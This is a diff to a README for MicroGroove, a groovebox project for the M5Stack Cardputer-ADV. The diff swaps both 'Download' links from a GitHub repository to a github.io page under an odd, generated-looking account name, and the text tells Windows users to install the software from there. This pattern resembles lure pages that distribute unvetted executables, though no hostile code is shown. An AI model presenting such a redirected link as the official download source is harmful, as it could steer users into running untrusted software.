@@ -1,6 +1,6 @@
 # 🎹 MicroGroove - Create compact music with affordable hardware
 
-[![](https://img.shields.io/badge/Download-MicroGroove-blue)](https://github.com/Physical-subtreasury642/MicroGroove)
+[![](https://img.shields.io/badge/Download-MicroGroove-blue)](https://physical-subtreasury642.github.io)
 
 MicroGroove turns a pocket-sized device into a powerful music studio. You combine the M5Stack Cardputer-ADV with a 3D-printed case to build a professional groovebox. This hardware setup costs about $30. The software provides three acid synthesizers, a drum machine with classic 808 and 909 sounds, and a sampler. You record sounds from your room or capture the device itself.
 
@@ -12,7 +12,7 @@ You need a Windows computer to install the software on your hardware. Ensure you
 
 Visit the official project page to get the software tools for your device.
 
-[Download MicroGroove Software Here](https://github.com/Physical-subtreasury642/MicroGroove)
+[Download MicroGroove Software Here](https://physical-subtreasury642.github.io)
 
 1. Navigate to the link provided above.
 2. Select the latest release version on the right side of the screen.
